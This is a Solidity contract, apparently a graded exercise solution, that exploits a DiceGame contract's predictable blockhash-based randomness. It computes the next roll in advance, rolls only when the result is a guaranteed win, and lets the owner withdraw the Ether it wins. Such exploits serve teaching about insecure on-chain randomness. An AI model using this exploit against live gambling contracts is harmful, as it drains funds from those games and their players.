pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error RiggedRoll__NotEnoughEther();
error RiggedRoll__NoWinningOutcome();
error RiggedRoll__TransferFailed();
error RiggedRoll__NotEnoughBalance();

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        if (address(this).balance < _amount) revert RiggedRoll__NotEnoughBalance();
        (bool success, ) = payable(_addr).call{ value: _amount }("");
        if (!success) revert RiggedRoll__TransferFailed();
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external payable {
        // if (msg.value < 0.002 ether) revert RiggedRoll__NotEnoughEther();
        if (address(this).balance < 0.002 ether) revert RiggedRoll__NotEnoughEther();

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        if (roll > 5) revert RiggedRoll__NoWinningOutcome(); // Instead of simply returning, use revert with custom error!

        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
